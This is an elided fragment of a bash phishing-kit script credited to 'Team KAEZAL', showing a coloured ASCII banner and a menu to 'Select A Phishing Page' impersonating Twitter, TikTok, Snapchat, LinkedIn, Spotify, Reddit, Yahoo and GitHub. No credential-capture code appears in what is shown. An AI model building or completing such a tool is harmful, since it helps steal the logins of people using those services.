...
banner() {
  ...
  _____  _     _ _____ _______ _     _ _______  ______
 ...
 "                 
		...
		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Team KAEZAL${WHITE}
	EOF
}
...
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select A Phishing Page ${RED}[${WHITE}::${RED}]${ORANGE}
		...
		${RED}[${WHITE}06${RED}]${ORANGE} Twitter     	
		${RED}[${WHITE}07${RED}]${ORANGE} Tiktok       
		${RED}[${WHITE}08${RED}]${ORANGE} Snapchat          			
		${RED}[${WHITE}09${RED}]${ORANGE} Linkedin      
		${RED}[${WHITE}10${RED}]${ORANGE} Spotify     
		${RED}[${WHITE}11${RED}]${ORANGE} Reddit       
		${RED}[${WHITE}12${RED}]${ORANGE} Yahoo
		${RED}[${WHITE}13${RED}]${ORANGE} Github        
